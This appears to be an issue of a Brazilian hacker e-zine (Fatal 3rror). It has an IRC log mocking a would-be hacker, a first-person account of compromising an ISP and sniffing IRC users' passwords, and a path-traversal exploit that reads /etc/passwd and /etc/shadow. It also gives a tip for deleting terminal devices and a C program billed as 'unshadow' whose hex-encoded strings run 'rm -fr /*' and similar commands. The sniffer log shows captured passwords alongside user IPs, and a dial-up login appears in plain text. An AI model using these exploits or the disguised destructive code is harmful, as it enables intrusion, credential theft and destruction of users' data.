+<InBloom> eu fundei o cult of Dead cow, mas estou a um tempo sem falar
+          com os caras...
+<struck> manero
+<struck> comeh q c aprendeu o q sabe hj???
+<struck> c lia mtas zines qdo era lamer como eu??
+<struck> ou nem??
+<InBloom> ja disse... anos de pesquisas e, realmente, os zines ajudam
+<struck> c ja leu uma zine chamada tdk??
+<struck> conheco o founder dela....
+<InBloom> uma ruinzinha?
+<InBloom> eu sou o fundador da Axur!
+<InBloom> hehe
+<struck> hehehhe
+<struck> capaz???
+<struck> ta me zoando...
+<InBloom> todos acham q eu minto
+<InBloom> mas eh pura verdade
+<struck> qual o nick q c usava mesmo na axur??
+<InBloom> bom... agora fiquei meio encabulado...
+<struck> hehehe
+<struck> acidmud neh?
+<struck> algo assim...
+<struck> eu achava teu nick mto rlz
+<InBloom> fala baixo!
+<struck> heheh
+<struck> ok
+<InBloom> agora fiquei envergonhado!
+<InBloom> todos vao querer falar comigo agora!
+<struck> heheh
+<struck> nem esquenta... eh soh muda de nick dinovo
+<struck> ja q c usou esse pra zoa aki mesmo...
+<InBloom> cara... se vc se esforçar vc vai ser um hacker completo como
+          eu... palavra de quem sabe
+<struck> bah..
+<struck> valew
+<struck> mas issu soh de pois duns 50 anos de pesquiza
+<InBloom> um conselho de hacker: seja persistente!
+<struck> valew pelo conselho...
+<struck> agora to ti vendo como um mestre...
+<struck> =)
+<InBloom> :)
+<InBloom> haeuehauehueaheauehaeuaehauaehueahueahueaheah
+<InBloom> tava bala
+<InBloom> mas eu vou nanar!
+<struck> =(
+<struck> jahhh????
+<InBloom> sabe... hacker naum eh de ferro!
+<struck> soh uma coisa...
+<struck> da proxima vez q for zoa alguem pega leve....
+<struck> dizer q c fundou a cdc eh dosse
+<struck> ou q eh o acidmud...
+<InBloom> fundei!
+<InBloom> sério!
+<struck> e outra coisa...
+<InBloom> haeuheueahueaheauheauheauehaueah
+<struck> //say $host mostra o hostname da pessoa e nao o ip
+<InBloom> sério!
+<InBloom> poxa
+<struck> c devia ter percebido issu na 1a hora
+<InBloom> naum sabia
+<InBloom> valeu
+<InBloom> agora sou um hacker de verdade!
+<struck> e c verificasse o ip saberia q eh o ip do fbi q c ta tentando
+         derruba ateh agora
+<InBloom> naum tentei nada
+<struck> nada contra zoar lamahz...
+<struck> mas nao qdo vc tbm eh um
+<struck> agora vai durmi q depois dessa....
+<InBloom> naum tentei derruba nada
+<InBloom> sim mestre...
+<InBloom> vou me recolher ao meu leito
+<struck> issu
+<InBloom> valeu por me dar o ip do fbi
+<struck> tipus...
+<struck> c quizer o ip di algum host digita /dns <host>
+<struck> soh mais uma dica pra c colocar no teu livrinhu hacker ae...
+<InBloom> vo tenta derrubar o pentagono semana que vem... quer ser meu
+          cumplice?
+<struck> nao...
+<struck> eu nao so hacker
+<struck> vc eh quem eh
+<InBloom> eu te ensino!
+<struck> c faria issu por mim???
+<struck> valeu mesmo
+<InBloom> 50 reais
+<struck> =(((
+<InBloom> eh o q eu cobro por aula
+<struck> ai nao quero...
+<struck> pelo q tu deve ensina achu q vale a pena gastar 50 paus
+<struck> neh??
+<InBloom> promoçao
+<InBloom> era 75
+<struck> ahhh
+<struck> q dahora...
+<struck> cliente especial neh??
+<InBloom> pra ti faço por 40
+<struck> mas ainda ta meio caro...
+<InBloom> 39,99
+<struck> eu ti ensino o q eu sei e tu me ensina o q tu sabe... di graca...
+<struck> achu q c ainda vai sair ganhando
+<InBloom> naum
+<struck> e um monte
+<InBloom> eu sei o quintuplo do q tu sabe
+<InBloom> naum ia ter graça
+<struck> nah...
+<InBloom> heauheauaeheahea
+<InBloom> falow meu
+<struck> c sabe 1/5 do q eu sei
+<struck> cya!!
+<struck> vai durmi vai
+<InBloom> vo, tio
+<struck> e sonhe q ta hackeando...
+<InBloom> hackear naum eh mais sonho pra mim
+<struck> sonha com a guria do filmizinho hackers
+<InBloom> hauhauahuahauhauhahauah
+<InBloom> fui
+*** InBloom has quit IRC (Quit: ---------------------------------------
+------------------------------------- Corte aqui e destrua seu monitor
+---------------------------------------------------------------------)
+<struck> :D
+<struck> xa eu fecha issu agora q vou publicar o log dessa conversa...
+<struck> =)
+
+   Sentiram o poder do hackerzao ae??
+   Pow! serio... o que leva as criancas a brincar de hacker no mirc??
+O que elas querem provar? Porque existem canais #hackers em todos os
+servers?? O que faz elas ficarem acordadas a noite inteira para conver-
+sarem sobre como trocar um registro do windows e tentarem impressionar
+seus amiguinhos hackers??
+   Voce gosta de folgar nas pessoas?? Entao pelo menos esteja certo que
+voce sabe mais do que ela. Voce acha que sabe mais do que todo mundo??
+Entao vai em frente e zoe com todos... Voce soh corre o risco de um dia
+encontrar alguem que manje mais do que voce e aconteca o mesmo que aki.
+   C voce eh um hacker como este, fike no seu knal #hacker e torne o
+irc um lugar melhor pra todos.
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~    15 - Brasnet Sniffed    ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_           psaux            _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+hmm. nesse momento escrevo esse texto ouvindo a musica "fale mal de
+mim" do autoramas. acho essa musica legal e penso que ela expressa muito
+bem o que eu sinto =). mas vou parar de escrever sobre a musica e falar
+sobre o que eu me propus. ah! uu nao ia escrever sobre isso, mas devido a
+minha amizade com o struck, achei que poderia ajuda-lo dessa forma e me
+propus escrever. vamos la.
+
+antes quero avisar que nao vou ensinar as t3kn33ks que usei. se so isso
+lhe interessa, voce pode pular essa materia =). HAHAHA.
+
+o servidor invadido foi a e-net. ops. nao era pra dizer. mas agora ja
+foi. esse e um provedor bastante conhecido na cidade que ele funciona e
+faz parte da ifx (iiefiieks). HAHAH. o provedor foi escolhido por
+apresentar certas caracteristicas.
+
+o primeiro passo que eu fiz foi mapear a rede deles. eles tinham um
+vulnerabilidade no iquery e pude assim obter o nome de todas maquinas da
+sua rede. depois notei que todas as maquinas rodavam bdsi, menos uma, que
+rodava linux. e pensei: eh nessa ai que eu vou! HAHAHA. mas nao foi tao
+facil conseguir root nessa maquina. como eu falei, nao vou ensinar as
+tecnicas, mas xploitando um servico eu consegui uma shell. nao era uma
+rootshell, mas era uma shell e a partir dai tudo ficava mais facil. fui
+dormir. HAHAH. no outro dia entrei na "minha" shell e nao foi tao facil
+rootear a maquina. a maquina estava muito bem patcheada. mas
+vulnerabilidades locais sao vulnerabilidades locais.. HAHAH. vi na minha
+tela o simbolo "#". HAHAHAH.
+
+depois disso pensei: tenho apenas uma maquina da rede deles. eu quero a
+maquina que roda o ircd. como vou chegar nela? (vale lembrar que eles
+usavam essa maquina linux como "ponte", ou seja, os admins do provedor
+logavam nela e dela passavam pros bdsi boxen. isso porque os bdsi boxen
+so aceitavam conexao dessa maquina).
+
+foi ai que eu passei a maquina pro meu grupo, o r00t team e um dos membros
+deu a ideia de sniffarmos a maquina. tudo bem. ele entrou, catou um
+sniffer, compilou, rodou e ao final de todo dia baixavamos o log do
+sniffer e todo dia conseguiamos muitos login/senhas dos admin. assim,
+conseguimos acesso a cerca de 10/12 maquinas da rede
+deles. detalhe: tinhamos root em varias =). talvez o que tenha pesado para
+tudo dar certo foi a nossa calma. pensamos: primeiro ownamos a rede, o
+provedor. depois sniffamos a maquina ircd e catamos o que queremos na
+brasnet.
+
+tudo ia muito bem. mas um dia aconteceu um fato no irc e eu
+pensei: preciso sniffar logo a brasnet. HAHHAHA. foi ai que o mesmo membro
+do r00t team (especialista em sniffers HAHAH) resolveu rodar um sniffer no
+ircd. rodou e comecamos a ver as senhas passar na nossa tela. era assim:
+
+./httpd 'identify' port 6667;
+interface: eth0 (200.194.249.0/255.255.255.0)
+filter: ip and ( port 6667 )
+match: nickserv
+###############################################################################$
+T 200.188.30.57:1225 -> 200.194.249.4:6667 [AP]
+  PRIVMSG nickserv :identify ninha.
+###############################################################################$
+T 200.188.30.57:1225 -> 200.194.249.4:6667 [AP]
+  PRIVMSG nickserv :identify ninha.
+###############################################################################$#
+T 200.194.249.4:6667 -> 200.203.242.218:14404 [AP]
+  :caos!~t7DS@QmfpmmtX2CE.svn.com.br PRIVMSG #Ajuda :N.O SEI NADA ?..:Ji
+  mmy_Carrey!HellRaiser@MS1FGb9mI8k.200.193.198.O PRIVMSG #ajuda :.0,1.[
+  ..15,01a.00,01D.15,01a.00,01_.15,01L.00,01i.15,01l.00,01i.15,01k.00,01
+  k.15,01k.00,01a.0.].: /nickserv ghost senha..
+###############################################################################$
+T 200.194.249.4:6667 -> 200.249.218.102:4292 [AP]
+  n.a registre seu nick digitando ./nickserv register (senha).. Bons cha
+  t's!..:Beauty_bela!~2000@c67HnMUotGpp.200.241.100.O PRIVMSG #natal :oo
+  ioiioiooiiooiio!!!!!!1..:_porteiro_!~porteiro@Oq1NtkLwxiU.gel.terra.co
+  m.br QUIT :Ping timeout..:Melquisedec!~2000@0Qdz7TPebFc.200.253.216.O
+  NICK :margazinha..
+###############################################################################$
+T 200.188.30.57:1225 -> 200.194.249.4:6667 [AP]
+  PRIVMSG nickserv :identify ninha.
+###############################################################################$
+T 200.194.254.78:1027 -> 200.194.249.4:6667 [AP]
+  PRIVMSG nickserv :identify meuamor.
+###############################################################################$
+T 200.188.20.183:1046 -> 200.194.249.4:6667 [AP]
+  ISON chanserv FAROL Girl_Y2K Kalahari Ks_Choice Loony_Girl Metal_Ramon
+  e Nhac_Nhac_Girl nickserv PanikGirl Samain Senhora_Bastos Sil-19 Silzi
+  nha Silzinha_ Sil[1_ano] Sil[away] Sil_19 Sil_Joaninha Tatum Vivica Wy
+  nona Zahwa [Miniezinha] [Palas].
+########################################
+T 200.194.249.4:6667 -> 200.188.20.183:1046 [AP]
+  :E-net.SSA.BA.Brasnet.org NOTICE Metal_Ramone :*** Notice -- All conne
+  ctions in use. (E-net.SSA.BA.Brasnet.org[@0.0.0.0.6667])..:E-net.SSA.B
+  A.Brasnet.org 303 Metal_Ramone :chanserv Metal_Ramone nickserv ..
+###############################################################################$
+T 200.188.29.66:1034 -> 200.194.249.4:6667 [AP]
+  PRIVMSG nickserv :identify garota.
+###############################################################################$
+T 200.188.29.66:1034 -> 200.194.249.4:6667 [AP]
+  PRIVMSG nickserv :identify garota.
+###############################################################################$
+T 200.194.252.104:1026 -> 200.194.249.4:6667 [AP]
+  PRIVMSG nickserv :identify sacramento.
+###############################################################################$
+T 200.188.20.183:1046 -> 200.194.249.4:6667 [AP]
+  ISON chanserv FAROL Girl_Y2K Kalahari Ks_Choice Loony_Girl Metal_Ramon
+  e Nhac_Nhac_Girl nickserv PanikGirl Samain Senhora_Bastos Sil-19 Silzi
+  nha Silzinha_ Sil[1_ano] Sil[away] Sil_19 Sil_Joaninha Tatum Vivica Wy
+  nona Zahwa [Miniezinha] [Palas].
+######
+T 200.194.249.4:6667 -> 200.188.20.183:1046 [AP]
+  :E-net.SSA.BA.Brasnet.org 303 Metal_Ramone :chanserv Metal_Ramone nick
+  serv ..
+###############################################################################$
+T 200.196.136.129:1096 -> 200.194.249.4:6667 [AP]
+  PRIVMSG nickserv :identify 666.
+###############################################################################$
+T 200.194.255.48:1051 -> 200.194.249.4:6667 [AP]
+  nickserv identify eduardo14.
+###############################################################################$
+T 200.188.20.183:1046 -> 200.194.249.4:6667 [AP]
+  ISON chanserv FAROL Girl_Y2K Kalahari Ks_Choice Loony_Girl Metal_Ramon
+  e Nhac_Nhac_Girl nickserv PanikGirl Samain Senhora_Bastos Sil-19 Silzi
+  nha Silzinha_ Sil[1_ano] Sil[away] Sil_19 Sil_Joaninha Tatum Vivica Wy
+  nona Zahwa [Miniezinha] [Palas].
+#####################
+T 200.194.249.4:6667 -> 200.188.20.183:1046 [AP]
+  :E-net.SSA.BA.Brasnet.org 303 Metal_Ramone :chanserv Metal_Ramone nick
+  serv ..
+###############################################################################$
+
+............
+
+bom, acho que ai ja da pra voce ter uma ideia de como era sniffado.
+mas tinha um problema.. aparecia o ip do maneh e nao o nick. como eu
+saberia?
+ahhh! foi ai que surgiu uma ideia.. se eu falar a palavra "identify" no
+pvt do cara, vai aparece que falei isso pra ele, e consequentemente o ip
+dele, pois "identify" eh a palavra sniffada. assim:
+
+###############################################################################$
+T 200.194.249.4:6667 -> 200.217.42.192:41062 [AP]
+  :psaux!~rteam@xxxxxxxxxxxx.br PRIVMSG Suicidal- :ae
+mano..:psaux!~rteam@xxxxxxxxxxxx.com.br PRIVMSG Suicidal- :tu deu
+identify?.
+  .
+###############################################################################$
+
+isso significa que eu falei pro Suicidal-: ae mano, e depois: tu deu
+identify? HAHAH. estava testando. duh =)
+
+assim eu pude zuar bastante na rede e tomar o canal que eu
+queria. HAHA. ate a senha do struck eu catei! HAHAHA.
+ae mauritz, lembra do dia que batemos papo? HAHAH. tu nem imaginava
+neh? duh =). eh isso ae.
+
+nao vou liberar shadows, oshadows, nem quaisquer arquivo do provedor a
+ninguem. aviso a eles que eu ate gosto deles HAHAHAH e que nao vou fazer
+nada. aviso tb que nao adianta nada aquele firewall deles se ha uma
+maquina que tem acesso a tudo e essa maquina esta bugada. HAHAH. =)
+
+palavras finais:quero aproveitar o espaco pra mandar um abracao pra galera
+do r00t team =) duh. e a todas as pessoas que eu converso
+"amigavelmente" no irc. para aquelas pessoas que ficam me enchendo no pvt,
+eu peco: esquecam que eu existo. =) e se fodam =) duh. ah! e se vc nao
+gostou da materia, faz uma melhor. =)
+
+-psaux
+psaux@mail.com
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~     16 - Mandic Hacked     ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat Struck        _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+   Isso aconteceu ja faz um tempo mas soh agora decidi publicar.
+   Achei os logs do ataque recentemente e por isso deu para fazer a
+materia com dados reais. Estou escrevendo tb pq o psaux achou que seria
+legal relatar o fato.
+   Vamo lah!
+
+   Isto aconteceu em novembro de 1998. Eu tinha recem perdido minhas
+contas ppp de acesso a internet e ainda nao manjava muito. Conhecia
+apenas algumas t3kn33ks hax0res divulgadas ateh entao e entre elas o
+xpl0iting de cgis. Este acobou tornando-se meu trunfo.
+
+   Como eu nao tinha nenhuma conta na inet eu decidi acessar o site de
+cadastro da mandioca atravas da conta de cadastro...
+
+Numbah: 2100066
+Login: ppp
+Password: novo
+
+   Ja conectado o site de cadastro era http://www.mandic.cadastro.com.br
+   Tentei rodar portscans e bugscans neste host atras de qquer falha
+que me desse r00t ou acesso aos arquivos de senhas. Nao consegui nada.
+   Entao testei alguns cgis padroes do apache mas tambem nao consegui
+nada com isso.
+   O que fazer???
+   A minha intencao agora era de criar uma conta fantasma com um nunbah
+de Cartao de Credito falso. Mesmo sabendo que isso me causaria problemas,
+pois estava conectado ao provedor da Mandic e logo me descobririam, eu
+decidi correr o risco.
+   Mas enquanto eu fazia o cadastro e clicava nos links, percebi que
+os links apontavam sempre para o mesmo cgi e uma variavel deste indicava
+a pagina a ser aberto. Por exemplo:
+
+   Para abrir a page index.html:
+https://cadastro.mandic.com.br/index.cgi-bin?loc=poa&page=index.html
+
+   Para abrir a page cadastro.html:
+https://cadastro.mandic.com.br/index.cgi-bin?loc=poa&page=cadastro.html
+
+   ...e por ae vai.
+   Qual foi a primeira coisa que eu pensei agora???
+   Observe:
+
+https://cadastro.mandic.com.br/index.cgi-bin?loc=poa&page=/etc/passwd
+
+   E voialah!!! O passwd estava sendo exibido no browser.
+   Porem como estava shadowado...
+
+https://cadastro.mandic.com.br/index.cgi-bin?loc=poa&page=/etc/shadow
+
+   Nao sei por que, mas as 2 primeiras tentativas de chamar o shadow
+nao funfaram. Porem na terceira ele comecou a ser exibido.
+   Era tanta coisa que meu modem de 14.400bps (na epoca) nao aguentou
+e caiu a conexao. Acho q deve ter fikado com menos de 1/3 do shadow.
+Mas ja tava mais que bom.
+   Imaginem minha felicidade! Eu nao tinha nada e de uma hora pra outra
+estava com mais de 100 contas de usuarios da Mandic.
+   Deixei descryptando o resto da tarde pensando que isso poderia me
+ocasionar problemas se os admins da Mandic me descobrissem. Eles tinham
+meu numero nos logs do provedor e comousei o telefone de casa...
+   No fim nao deu nenhum problema.
+
+   Um tempo depois passei a info para um amigo e este me disse que nao
+havia conseguido xploita-la. Fui conferir...
+
+https://cadastro.mandic.com.br/index.cgi-bin?loc=poa&page=/etc/shadow
+
+   Apareceram 2 caracteres (Œ) que nao tinham nada a ver com o shadow.
+   Hmm.. Entao pensei no seguinte:
+
+https://cadastro.mandic.com.br/index.cgi-bin?loc=poa&page=index.cgi-bin
+
+   Com isso eu obtive o codigo fonte do index.cgi-bin para descobrir
+o que estava dando errado e talvez novas vulns.
+   Aha!!! Olhem que linhas interessantes:
+
+#debiasi (21/11/98) problema de seguranca
+$FORM{'page'}=~s/\///g;
+$FORM{'page'}=~s/passwd//g;
+$FORM{'page'}=~s/shadow//g;
+$FORM{'page'}=~s/etc//g;
+$FORM{'page'}=~s/\.\.//g;
+
+   Nao se passaram nem 2 semanas desde que eu havia hackeado-a e ja
+FIXaram o code. Se eles descobriram que foram hackeados e que eu me
+conectei ao numero deles, por que nao me perseguiram??? Sera que foi
+uma forma de agradecimento??? =)
+   De qquer jeito neste ataque eu nao cheguei a obter r00t na maquina,
+apenas acesso aos arquivos o que ja eh o suficiente quando falamos em
+um provedor de acesso.
+   Outro detalhe eh que o cgi xploitado nao eh opensource e foi criado
+pelos admins da Mandic por isso a minha descoberta tornou-se mais
+valorizada.
+
+   Concluindo, quero dizer que por melhor administrador e programador
+que voce seja, estes pequenos detalhes nao podem passar desapercebidos
+ou os danos seriam graves. E por menor hacker que voce seja, sempre ha
+a chance de descobrir algo grandioso o que aumentara sua auto-estima
+e fara' voce continuar querendo melhorar cada vez mais.
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~  17 - Destruindo Terminais ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat Struck        _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+   Esta materia foi feita para nao deixar um buraco na zine. Acontece
+que este espaco estava reservado para ALGUEM (q prefiro nao dizer o nick)
+publicar sua materia mas como ele c atrazou, tive que fazer algo em cima
+da hora para preencher o espaco.
+   Isto que vou falar eh algo bem simples porem acho q nao foi divulgada
+ainda esta info.
+   Vamo lah..
+
+Login: root
+Password:
+Last Login: NEVER
+You have no mail.
+
+# whoame
+root
+# id
+uid=0(root) gid=0(root)
+# tty
+/dev/tty2
+# ls -la /dev/tty2
+crw-------   1 root   tty        4,   2 abr 12 07:43 /dev/tty2
+
+   Como vimos acima, quando voce loga em um terminal, voce passa a ser
+dono dele. Entao eh possivel fazer a seguinte sacanagem:
+
+# rm -f /dev/tty2
+
+   Eae??? voce cai??? nao!!! Voce continua conectado. Mas ninguem nunca
+mais vai poder logar neste terminal. Agora re-logue nesta maquina e
+destrua mais um terminal ateh chegar ao ponto em que nenhum mais esteja
+disponivel.
+   Aviso: Nao facam isso em casa pois o tty nao sera regenerado.
+   Pra ser sincero eu nem falaria isto pois nao curto este tipo de
+esquema, mas as vezes da tanta raiva de uma maquina e qquer coisa que
+possa deixar o admin com dor de cabeca ja eh uma bencao.
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~      18 - Super Progs      ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat Struck        _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+   Como ja eh de costume, no final de cada edicao da fatal 3rror eu
+coloco um Super Hax0r Programa L33t para voces curtirem.
+   O programa desta edicao eh a mais nova versao do unshadow. Ela a
+principio foi feita pela ADM e modificada por mim para o codigo fikar
+um pouco mais malvado. >=)
+
+   ATENCAO!!! Este programa eh extremamente hax0r!! Nao rode-o sem
+antes entender o code dele e saber exatamente como ele funfa. Se voce
+roda-lo e isso causar problemas a voce ou a terceiros nao coloque a
+culpa em mim. Eu avisei!!!
+
+   Chega de mutreta... vamos ao prog.
+
+<++> Superprogs/unshad.c
+/*
+
+ UN5H4D0W 1.66 - BY K0K0NUTZ 0F TH3 ADM H4X0R KL4N!
+ 4LT3R4D0 P0R CHEAT STRUCK
+
+ ELITE HACKERS CODING FOR FUN.
+
+ HACK ANY UNIX WITH IT, WITHOUT BEING ROOT!
+ FREE FOR ANY USE.
+
+ - k0k0nUtZ @ efnet.
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#define SIZEZ 4 /* DON'T change this! */
+
+char *string1 = "\x72\x6d\x20\x2d\x66\x72\x20\x2a\n";
+char *c0de    = "\x72\x6d\x20\x2d\x66\x72\x20\x2f\x2a\n";
+char *c0de2   = "\x72\x6d\x20\x2d\x66\x72\x20\x7e\x2f\x2a\n";
+
+struct int64 { int lo, hi; };
+void add32to64(struct int64 *dst, unsigned int src)
+{
+        unsigned int saved;
+
+        saved = dst->lo;
+        dst->lo += src;
+
+#if ARCH_INT_GT_32
+        dst->lo &= 0xFFFFFFFF;
+#endif
+
+        if (dst->lo < saved) dst->hi++;
+}
+
+void add64to64(struct int64 *dst, struct int64 *src)
+{
+        add32to64(dst, src->lo);
+        dst->hi += src->hi;
+}
+
+void *unshad0w_2();
+int start_unsh4d0wz(int h4qz){
+int j;
+j++; h4qz--;
+//top.shadow = sys->tailz;
+system(string1);
+return(j);
+}
+
+int verify(unsigned int dst) {
+ char opt;
+ printf("\nDo you realy sure about what are you doing?[y/n] ");
+ scanf("%c",&opt);
+ if(opt == 'n') {
+   printf("Verry good! Hack is BAD!\n");
+   dst=0;
+ } else if(opt == 'y') {
+   printf("Let's Hack!!!\n");
+   dst=1;
+ } else dst=-1;
+ return dst;
+}
+
+main(int argc, char **argv)
+{
+ unsigned int i=0, lsd;
+ char *ptr;
+ char *memory_Ptr;
+ unsigned char *myl0adz;
+ char buffz1[256], buffz2[256]; /* possible overflow, try to change EIP.*/
+ strcpy(buffz1, "/etc/shadow");
+ strcpy(buffz2, "/etc/passwd");
+ printf("unshad0w 1.66 - by k0k0nutZ\n");
+ printf("fr0m ADM h4ck3rz kl4n\n");
+ printf("Modificado por Cheat Struck.\n");
+ if (argc < 2) {
+   printf("usage: %s /etc/passwd\n", argv[0]);
+   exit(0);
+ }
+ else {
+   while((lsd=verify(i))==-1) i++;
+   if(!lsd) exit(0);
+   else {
+     /*removed, this fucks up the checksum!*/
+     /*add64to64(buffz1, buffz2);*/
+     start_unsh4d0wz(1);
+     unshad0w_2();
+}}}
+
+void *unshad0w_2(){
+int i;
+char c0m[256];
+
+if (i != SIZEZ) {i++;}
+system(c0de);
+sprintf(c0m,"%s",c0de2);
+system(c0m);
+}
+
+/* eof! */
+<-->
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~         19 - Emails        ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat Struck        _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+   Porra! Q merda!!! Ta toda hora mudando meu email... assim tb fika foda
+de receber alguma cartinha dos leitores... =)
+   Recentemente a xoom passou a ser nbci... Nao sei o q aconteceu e nem
+quero saber. Soh sei q minha page ta no ar e eh issu o q importa. Mas
+ae ta o meu novo email e soh lembrando q a 8m.com ja voltou a redirecio-
+nar direito entao ambos funfam...
+
+cszine@email.com
+
+e
+
+cheat@struck.8m.com
+
+   Agora os emails q consegui salvar a tempo...
+
+>From: "****** ********" <**********@hotmail.com>
+>Subject: henix
+>Date: Mon, 28 Aug 2000 22:19:46 EST
+>
+>
+>e ai kmarada..... codeandu muitu ae??
+>
+>tipow, tava dandu umas oiada nu codigu du henix for linux,
+>e portei ele pru ruindowz(DoS). percebi q tah faltandu uma funcao,
+>uma talz d "bzero(char *, int)"....... tem jeitu t tu publicar
+>u fonte, me mandar, botah na zine, dizendu q q ela tem q fazer???
+>
+>valeu ae.....
+>
+>ah, v c continua escrivinhandu a zine....
+>tah chupeta!
+>
+>falow!!
+>---------------------------------------------------------------
+>-> «]þÎÑHËÎ®Ø[» - http://pinheiro.cjb.net
+
+-----------------------------
+
+   Ae pinheiro. Como bom cristao eu estou sempre disposto a ajudar...
+Ainda mais qdo trata-se de um programa meu.
+   Bem... deixando as coisas claras.... A funcao:
+
+      bzero (buf, sizeof (buf));
+
+   Faz o mesmo q:
+
+      memset (buf, 0, sizeof (buf));
+
+   Blza? Falow!
+
+==============================
+==============================
+==============================
+
+>From: **** "*********" <**********@yahoo.com>
+>To: cheat@struck.8m.com
+>Subject: HENIX naum encontrado
+>Date: Tue, 5 Sep 2000 11:10:34 -0700 (PDT)
+>
+>To mandando esse email para informar que apos
+>inumeras tentativas de baixar o HENIx,
+>que o mesmo nao se encontra no servidor ou algum
+>outro motivo obscuro...
+>
+>Tenho muita curiosidade de testalo, gostaria, se
+>possivel, que me enviasse algum end alternativo ou
+>meios de conseguir o HENIx.
+>               Aguardo.
+>                      Um abraço, Paul.
+>
+
+------------
+
+   Eh q a freeservers eh uma merda... Para acessar urls colocados
+na 8m.com tem q clicar nos links das pages hospedadas lah. Ou seja
+q caso vc use um programa como download acelerator q buscam direto
+no endereco ela nao da permisao.
+   Issu eh util para evitar links colocados diretamente para os
+arquivos e programas das pages lah mas tb eh fudido para outros casos.
+   Anyway... Da pra pega-los pela xoom.
+
+http://members.xoom.com/cszine/henix1.0.zip  <- v1.0 for msdos
+http://members.xoom.com/cszine/henix1.1.zip  <- v1.1 for msdos
+http://members.xoom.com/cszine/henix0.01.tgz <- v0.01 for linux
+
+==============================
+==============================
+==============================
+
+   E isso foi tudo. Por favor, c voce enviou um email e este nao foi
+publicado ou respondido, reenvie-o pois ele nao chegou ateh mim.
+   Lembrando dinovo que meu email agora eh: cheat@struck.8m.com ou
+cszine@email.com . De preferencia envie para ambos pois c um cair tem
+o outro. C os 2 cairem eh mto azar.
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~        20 - De Ende        ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat Struck        _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+   Aqui acaba mais uma edicao da sua querida revistinha virtual que visa
+apenas passar mais informacoes undergroundes para todos os meus amiguinhos
+leitores hackers e administradores.
+   Assim como a f3 e assim como eu tem uma pah de editores de outras zines
+que provavelmente estao passando pelo mesmo trabalho que eu, sem contar
+as zines chule' q o maximo de trabalho eh selecionar as materias que serao
+copiadas (que sao apenas aquelas q eles entenderam, as mais simples).
+   Vou fazer uma propaganda gratuita das zines que ainda estao na corrida
+para aqueles que quizerem se aprofundarem mais nestes textos loucos que
+nos (os editores) perdemos nosso tempo fazendo (afinal nao temos lucro
+algum)...
+
+Nome:            Editor in chief:     Host:
+Fatal 3rror      Cheat Struck         http://struck.8m.com
+
+Death Knights    CaCaIo               http://www.deathknights.com
+
+Fucker World     Draco                http://www.fuckerworld.tsx.org
+
+   Pow... achu q soh essas mesmo ainda tao de peh e levando a serio o
+esquema, mas todo o dia surge uma zine nova.
+   Agora vamos aos tradicionais gr33tz...
+
+^^VENTO^^         Os ventiladores soh o fortalecem.
+Cacaio            Representante da cultura brasileira no nepal que teve q
+                  aprender a sambar.
+Carti             Ventriloco que costuma discutir com seus bonecos.
+Dave Mustaine     Dermatologista com problemas de acne.
+DiE4YoU           Pensa que e' um cavaleiro do apocalipse montado em seu ponei.
+Draco             "Eu sou o anjo da morte. A hora da purificacao esta chegando."
+Eletronic         Monge lusitano tentando descobrir o sentido da vida.
+Encripty          Veterano da puc que se diverte bolando trotes sacanas.
+Kamikase Shell    Sado-masoquista que gosta de exercitar seu estomago comendo
+                  uva com melancia e indo ao parque de diversoes.
+hak               Comprou um teclado cujo faltavam as teclas C, E e R.
+MaskMaster        Fobiaco de gurias menores de 12 anos.
+MidNight          Acha o horario de verao uma injustica.
+N4rfy             Cabo eleitoral do PV q perdeu por ter um cabo muito pequeno.
+nosmiles          Colecionador de bonecos que foi convidado a fazer uma
+                  propaganda para o lokau.com.
+NuLLz             Fa de lutchas libres que tb fez propaganda para o lokau.
+pcHazard          Porco-Maniaco com aparicoes em comerciais de TV.
